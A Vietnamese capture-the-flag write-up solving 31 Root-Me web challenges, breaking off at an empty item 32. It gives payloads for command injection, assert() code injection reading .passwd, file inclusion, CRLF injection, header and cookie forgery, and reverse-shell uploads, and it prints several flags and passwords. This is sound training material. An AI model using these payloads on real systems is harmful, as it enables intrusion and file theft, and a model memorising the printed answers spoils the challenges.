# Writeup Rootme from KCSC member

### 1. HTML - Source code
http://challenge01.root-me.org/web-serveur/ch1/
View source F12 hoặc Ctrl U để xem flag

### 2. HTTP - Open redirect
http://challenge01.root-me.org/web-serveur/ch52/
Chuyển hướng đến 1 trang web khác và hash md5
Paypak: `/?url=https://github.com&h=3097fca9b1ec8942c4305e550ef1b50a`

### 3. HTTP - User-agent
http://challenge01.root-me.org/web-serveur/ch2/
Thay đổi User-agent thành admin

### 4. Weak password
http://challenge01.root-me.org/web-serveur/ch3/
guess tài khoản và password: admin/admin

### 5. PHP - Command injection
http://challenge01.root-me.org/web-serveur/ch54/
Sử dụng `;` để tách lệnh gửi.
Paypak: `127.0.0.1;cat index.php`

### 6. Backup file
http://challenge01.root-me.org/web-serveur/ch11/
Các file backup thường có dấu hiệu là ~ hoặc .bak
Paylak: `/index.php~`

### 7. HTTP - Directory indexing
http://challenge01.root-me.org/web-serveur/ch4/
View source tìm thấy `admin/pass.html` 
quay về đường dẫn `admin` thấy xuất hiện thư mục khác
Paylak: `/admin/backup/admin.txt`

### 8. HTTP - Headers
http://challenge01.root-me.org/web-serveur/ch5/
Check Headers thấy `Header-RootMe-Admin: none`
Paylak: `Header-RootMe-Admin: admin`

### 9. 	HTTP - POST
http://challenge01.root-me.org/web-serveur/ch56/
Gửi giá trị cao hơn 999999
Paylak:
```bash
curl http://challenge01.root-me.org/web-serveur/ch56/ -X POST -d="score=1000000&generate=Give a try!" -H "Content-Type: application/x-www-form-urlencoded"
```

### 10. HTTP - Improper redirect
http://challenge01.root-me.org/web-serveur/ch32/
Sau khi chuyển hướng trang bằng Location đã ko sử dụng exit() nên phần code sau vẫn được thực hiện.

### 11. HTTP - Verb tampering
http://challenge01.root-me.org/web-serveur/ch8/
Bypass bằng cách dùng methods khác.
Paylak:
```bash
curl -X PUT http://challenge01.root-me.org/web-serveur/ch8/
```

### 12. Install files
http://challenge01.root-me.org/web-serveur/ch6/
Tìm đến đường dẫn file install của `phpbb`
```Python
/phpbb/install/install.php
```

### 13. CRLF
http://challenge01.root-me.org/web-serveur/ch14/
Tạo giả thông báo xác thực thành công
```Python
?username=admin authenticated.%0D%0Aadmin&password=kcsc
```

### 14. File upload - Double extensions
http://challenge01.root-me.org/web-serveur/ch20/
Upload 1 con reverse shell php với tên a.php.jpg

### 15. File upload - MIME type
http://challenge01.root-me.org/web-serveur/ch21/
Upload 1 con reverse shell php với tên a.php, dùng burpsuite edit mime type thành image/jpeg

### 16. HTTP - Cookies
http://challenge01.root-me.org/web-serveur/ch7/
Submit email thấy ta cần quyền admin.
Sửa cookie thành `ch7=admin`

### 17. PHP - assert()
http://challenge01.root-me.org/web-serveur/ch15/ch15.php
Lỗi tương tự như lỗi inject LFI hay RFI, ta có thể viết code theo ý muốn của mình.
Theo như đề thì ta cần đọc file .passwd
```Python
?page='%2C'..')%20%3D%3D%3D%20false%20and%20system('cat%20.passwd')%3B%2F%2F
```

### 18. PHP - Filters
http://challenge01.root-me.org/web-serveur/ch12/
Sử dụng giao thức của php để đọc file trên hệ thống.
```Python
http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php
```
Decode đoạn mã base64 tìm đc password.

### 19. PHP register globals
http://challenge01.root-me.org/web-serveur/ch17/
Dùng dirb tìm được file backup là `index.php.bak`
Set giá trị của `$_SESSION['logged']` về là 1
```Python
http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1
```

### 20. Local File Inclusion
http://challenge01.root-me.org/web-serveur/ch16/
LFI :3
```Python
?files=coding&f=../../admin/index.php
```

### 21. Local File Inclusion - Double encoding
http://challenge01.root-me.org/web-serveur/ch45/
Double encoding URL 
```Python
?page=php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dconf
```

### 22. PHP - Loose Comparison
http://challenge01.root-me.org/web-serveur/ch55/
```bash
curl http://challenge01.root-me.org/web-serveur/ch55/ -X POST -d="s=0e1&h=240610708"
```

### 23. HTML - disabled buttons
http://challenge01.root-me.org/web-client/ch25/
Bỏ set attr `disabled` cho 2 thẻ input

### 24. Javascript - Authentication
http://challenge01.root-me.org/web-client/ch9/
View-source thấy được file `login.js`

### 25. Javascript - Source
http://challenge01.root-me.org/web-client/ch1/
View-source

### 26. Javascript - Authentication 2
http://challenge01.root-me.org/web-client/ch11/
View-source file `login.js` và tìm thấy username pass được split bằng dấu `:`

### 27. Javascript - Obfuscation 1
http://challenge01.root-me.org/web-client/ch4/ch4.html
unescape() giá trị của biến `pass`

### 28. Javascript - Obfuscation 2
http://challenge01.root-me.org/web-client/ch12/ch12.html
unescape() giá trị của pass 2 lần sau đó run trên console:
```javascript
String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54)
```

### 29. Javascript - Native code
http://challenge01.root-me.org/web-client/ch16/ch16.html
Debug Javascript
```javascript
a=prompt('Entrez le mot de passe');if(a=='toto123lol'){alert('bravo');}else{alert('fail...');}
```

### 30. Javascript - Webpack
http://challenge01.root-me.org/web-client/ch27/
Có sourcemap nên t debug được flag:
`BecauseSourceMapsAreGreatForDebuggingButNotForProduction`

### 31. Javascript - Obfuscation 3
http://challenge01.root-me.org/web-client/ch13/ch13.html
Convert ascii dãy số ta được flag.
```javascript
55,56,54,79,115,69,114,116,107,49,50
```

### 32. 

